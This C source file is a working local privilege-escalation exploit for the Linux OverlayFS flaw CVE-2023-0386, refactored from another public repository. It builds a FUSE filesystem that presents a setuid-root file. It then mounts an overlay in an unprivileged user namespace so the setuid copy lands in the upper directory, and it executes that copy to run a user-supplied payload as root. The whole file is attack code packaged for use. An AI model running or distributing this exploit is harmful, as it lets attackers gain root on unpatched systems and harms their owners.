// Kudos to https://github.com/xkaneiki/CVE-2023-0386
// Just refactored and eased code to only one binary.

#define FUSE_USE_VERSION 29
#include <errno.h>
#include <fuse.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <signal.h>

char SHELL[0x5000000];

#define STR_LENGTH 500
char DIR_BASE[STR_LENGTH];
char DIR_WORK[STR_LENGTH];
char DIR_LOWER[STR_LENGTH];
char DIR_UPPER[STR_LENGTH];
char DIR_MERGE[STR_LENGTH];


void fatal(const char *msg)
{
    perror(msg);
    exit(1);
}

static int getattr_callback(const char *path, struct stat *stbuf)
{
    printf("%s\n", "[+] getattr_callback");
    memset(stbuf, 0, sizeof(struct stat));

    if (strcmp(path, "/file") == 0)
    {
        printf("%s\n", path);
        stbuf->st_mode = S_IFREG | 04777;
        stbuf->st_nlink = 1;
        stbuf->st_uid = 0;
        stbuf->st_gid = 0;
        stbuf->st_size = sizeof(SHELL);
        return 0;
    }
    else if (strcmp(path, "/") == 0)
    {
        printf("%s\n", path);
        stbuf->st_mode = S_IFDIR | 0777;
        stbuf->st_nlink = 2;
        stbuf->st_uid = 1000;
        stbuf->st_gid = 1000;
        return 0;
    }
    return -ENOENT;
}

static int open_callback(const char *path, struct fuse_file_info *fi)
{
    printf("%s\n", "[+] open_callback");
    printf("%s\n", path);
    if (strcmp(path, "file") == 0)
    {
        int fd = open("", fi->flags);

        return -errno;
    }
    return 0;
}

static int read_callback(const char *path,
                         char *buf, size_t size, off_t offset,
                         struct fuse_file_info *fi)
{
    printf("%s\n", "[+] read_callback");
    printf("    path  : %s\n", path);
    printf("    size  : 0x%lx\n", size);
    printf("    offset: 0x%lx\n", offset);
    char tmp;
    if (strcmp(path, "/file") == 0)
    {
        size_t len = sizeof(SHELL);
        if (offset >= len)
            return 0;
        if ((size > len) || (offset + size > len))
        {
            memcpy(buf, SHELL + offset, len - offset);
            return len - offset;
        }
        else
        {
            memcpy(buf, SHELL + offset, size);
            return size;
        }
    }
    return -ENOENT;
}


// needed for touch
static int ioctl_callback(const char *p, int cmd, void *arg,
                          struct fuse_file_info *fi, unsigned int flags, void *data)
{
    printf("%s\n", "[+] ioctl callback");
    printf("path %s\n", p);
    printf("cmd 0x%x\n", cmd);
    return 0;
}

static int readdir_callback(const char *path, void *buf, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi)
{
    printf("%s\n", "[+] readdir");
    filler(buf, "file", NULL, 0);
    return 0;
}

static struct fuse_operations fops = {
    .getattr = getattr_callback,
    .open = open_callback,
    .read = read_callback,
    .ioctl = ioctl_callback,
    .readdir = readdir_callback,
};

void start_fuse()
{
    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
    struct fuse_chan *chan;
    struct fuse *fuse;

    if (!(chan = fuse_mount(DIR_LOWER, &args)))
        fatal("fuse_mount");

    if (!(fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL)))
    {
        fuse_unmount(DIR_LOWER, chan);
        fatal("fuse_new");
    }

    fuse_set_signal_handlers(fuse_get_session(fuse));
    fuse_loop_mt(fuse);
    fuse_unmount(DIR_LOWER, chan);
}

void preps()
{
    char buf[4096];
    if (mkdir(DIR_BASE, 0777))
        perror("mkdir");
    sprintf(buf, "rm -rf '%s/*'", DIR_BASE);
    system(buf);
    if (mkdir(DIR_LOWER, 0777))
        perror("mkdir");
    if (mkdir(DIR_UPPER, 0777))
        perror("mkdir");
    if (mkdir(DIR_WORK, 0777))
        perror("mkdir");
    if (mkdir(DIR_MERGE, 0777))
        perror("mkdir");
}

int main(int argc, char const *argv[])
{
    char buf[8192];
    // argv[1] = payload to launch
    // argv[2] = base_dir
    if (argc < 3)
    {
        puts("[-] usage:");
        puts("./exploit [payload path] [base_dir path]");
        return -1;
    }

    int fd = open(argv[1], O_RDONLY);
    if (fd < 0)
    {
        fatal("open payload");
    }
    int clen = 0;
    while (read(fd, SHELL + clen, 1) > 0)
        clen++;
    close(fd);

    strcpy(DIR_BASE, argv[2]);
    snprintf(DIR_WORK, STR_LENGTH, "%s/%s", argv[2], "work");
    snprintf(DIR_LOWER, STR_LENGTH, "%s/%s", argv[2], "lower");
    snprintf(DIR_UPPER, STR_LENGTH, "%s/%s", argv[2], "upper");
    snprintf(DIR_MERGE, STR_LENGTH, "%s/%s", argv[2], "merge");

    preps();

    setuid(0);
    setgid(0);

    int pid = fork();
    if (pid == 0)
    {
        start_fuse();
    }
    else
    {
        printf("Waiting 1 sec...\n");
        sleep(1);
        sprintf(buf, "unshare -r -m sh -c 'mount -t overlay overlay -o lowerdir=%s,upperdir=%s,workdir=%s %s && ls -la %s && touch %s/file'", DIR_LOWER, DIR_UPPER, DIR_WORK, DIR_MERGE, DIR_MERGE, DIR_MERGE);
        printf("%s\n", buf);
        system(buf);
        kill(pid, SIGINT);
        sprintf(buf, "%s/file", DIR_UPPER);
        printf("%s\n", buf);
        system(buf);
    }
    return 0;
}
